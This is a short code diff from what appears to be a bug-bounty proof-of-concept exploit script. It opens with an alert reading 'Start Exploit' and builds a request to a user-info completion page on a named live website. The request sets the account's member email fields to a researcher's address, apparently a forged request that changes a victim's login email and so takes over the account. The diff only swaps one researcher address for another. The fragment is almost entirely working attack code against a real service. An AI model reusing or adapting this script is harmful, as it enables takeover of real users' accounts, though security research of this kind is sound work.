@@ -3,9 +3,9 @@ alert("Start Exploit");
   const url = "https://y-3.com/mypage/user_info_complete.html";
 
   const body = new URLSearchParams({
-    member_mail: "thebee0x+1@wearehackerone.com",
-    member_mail2: "thebee0x+1@wearehackerone.com",
-    member_bef_mail: "thebee0x+1@wearehackerone.com",
+    member_mail: "thebee0x@bugcrowdninja.com",
+    member_mail2: "thebee0x@bugcrowdninja.com",
+    member_bef_mail: "thebee0x@bugcrowdninja.com",
     member_first_name: "bb",
     member_family_name: "ccc",
     member_first_name_kana: "スミス",
